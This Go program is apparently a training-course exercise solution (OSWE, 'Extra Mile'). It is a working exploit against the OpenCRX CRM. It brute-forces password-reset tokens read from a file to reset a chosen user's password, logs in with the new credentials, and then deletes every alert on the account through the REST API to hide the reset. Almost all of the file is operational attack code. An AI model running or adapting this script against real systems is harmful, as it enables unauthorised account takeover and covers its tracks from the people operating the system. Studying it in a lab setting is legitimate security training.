package main

import (
	"bufio"
	"crypto/tls"
	"flag"
	"fmt"
	"github.com/antchfx/xmlquery"
	"log"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"strings"

	"github.com/iPhantasmic/OSWE/scripts/utils"
)

// Ex 9.2.5.3 - Extra Mile: Password reset chain with alert deletion

var client *http.Client

const proxyURL = "http://127.0.0.1:8080"

func resetPasswordAlert(debug bool, ip, username, password string) bool {
	requestURL := fmt.Sprintf("http://%s:8080/opencrx-core-CRX/PasswordResetConfirm.jsp", ip)

	file, err := os.Open("tokens.txt")
	if err != nil {
		log.Fatalln("Failed to open file: ", err)
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	scanner.Split(bufio.ScanLines)

	for scanner.Scan() {
		token := scanner.Text()

		// t=resetToken&p=CRX&s=Standard&id=guest&password1=password&password2=password
		data := url.Values{
			"t":         {strings.TrimSpace(token)},
			"p":         {"CRX"},
			"s":         {"Standard"},
			"id":        {username},
			"password1": {password},
			"password2": {password},
		}

		request := utils.PostRequest{
			ContentType: "form",
			Cookies:     []*http.Cookie{},
			FormData:    data,
		}

		response := utils.SendPostRequest(client, debug, requestURL, request)

		if !strings.Contains(response.ResponseBody, "Unable to reset password") {
			utils.PrintSuccess("Successful reset with token: " + strings.TrimSpace(token))
			return true
		}
	}

	return false
}

func login(debug bool, ip, username, password string) bool {
	requestURL := fmt.Sprintf("http://%s:8080/opencrx-core-CRX/ObjectInspectorServlet?loginFailed=false", ip)
	utils.SendGetRequest(client, debug, requestURL, utils.GetRequest{})

	requestURL = fmt.Sprintf("http://%s:8080/opencrx-core-CRX/j_security_check", ip)

	// j_username=guest&j_password=password
	data := url.Values{
		"j_username": {username},
		"j_password": {password},
	}

	request := utils.PostRequest{
		ContentType: "form",
		Cookies:     []*http.Cookie{},
		FormData:    data,
	}

	response := utils.SendPostRequest(client, debug, requestURL, request)

	// successfully logged in after 303 redirect should contain a script
	if !strings.Contains(response.ResponseBody, "opencrx-core-CRX/./ObjectInspectorServlet?requestId") {
		return false
	}

	utils.PrintSuccess("Successfully logged in!")
	return true
}

func clearAlerts(debug bool, ip, username, password string) {
	requestURL := fmt.Sprintf("http://%s:8080/opencrx-rest-CRX/org.opencrx.kernel.home1/provider/CRX/segment/Standard/userHome/guest/alert", ip)

	// login with HTTP Authorization Basic headers
	response := utils.SendGetRequest(client, debug, requestURL, utils.GetRequest{AuthUser: username, AuthPass: password})

	// parse the XML response body
	doc, err := xmlquery.Parse(strings.NewReader(response.ResponseBody))
	if err != nil {
		log.Fatalln("Failed to parse XML document: ", err)
	}

	// search from document root for all Alert objects and retrieve their href attributes
	alerts := xmlquery.Find(doc, "//org.opencrx.kernel.home1.Alert/@href")
	for _, alert := range alerts {
		utils.PrintInfo("Deleting: " + alert.InnerText())
		res := utils.SendDeleteRequest(client, debug, alert.InnerText(), utils.DeleteRequest{AuthUser: username, AuthPass: password})
		if res.StatusCode == 204 {
			utils.PrintSuccess("Deleted: " + alert.InnerText())
		} else {
			utils.PrintFailure("Failed to delete: " + alert.InnerText())
		}
	}
}

func main() {
	var tr *http.Transport
	useProxy := flag.Bool("proxy", false, "use proxy")
	debug := flag.Bool("debug", false, "debug mode")
	flag.Parse()
	// parse args
	args := os.Args[:]
	log.Println("Args: ", args)

	if len(args) < 4 {
		utils.PrintFailure(fmt.Sprintf("usage: %s [-debug=true] [-proxy=true] <target> <username> <password>", os.Args[0]))
		utils.PrintFailure(fmt.Sprintf("eg: %s 192.168.236.126 guest password", os.Args[0]))
		os.Exit(1)
	}

	ip := flag.Arg(0)
	username := flag.Arg(1)
	password := flag.Arg(2)

	if *useProxy {
		// disable TLS verification and set proxy URL
		proxyUrl, _ := url.Parse(proxyURL)
		tr = &http.Transport{
			TLSClientConfig:    &tls.Config{InsecureSkipVerify: true},
			DisableCompression: true, // to ensure that we can obtain Content-Length response header
			Proxy:              http.ProxyURL(proxyUrl),
		}
	} else {
		tr = &http.Transport{
			TLSClientConfig:    &tls.Config{InsecureSkipVerify: true},
			DisableCompression: true, // to ensure that we can obtain Content-Length response header
		}
	}

	// cookie jar to help us manage cookies
	jar, err := cookiejar.New(nil)
	if err != nil {
		log.Fatalln("Error while creating cookie jar", err)
	}

	// create our HTTP client using the above transport and cookie jar, then set the global variable
	client = &http.Client{
		Transport: tr,
		Jar:       jar,
	}

	utils.PrintInfo("Starting token spray now. Please wait...")
	if !resetPasswordAlert(*debug, ip, username, password) {
		utils.PrintFailure("Failed to perform password reset!")
		os.Exit(1)
	}

	utils.PrintInfo("Logging in with new credentials...")
	if !login(*debug, ip, username, password) {
		utils.PrintFailure("Failed to login!")
		os.Exit(1)
	}
	fmt.Println("")

	utils.PrintInfo("Clearing alerts now...")
	clearAlerts(*debug, ip, username, password)

	fmt.Println("")
	utils.PrintSuccess("Done!")
}
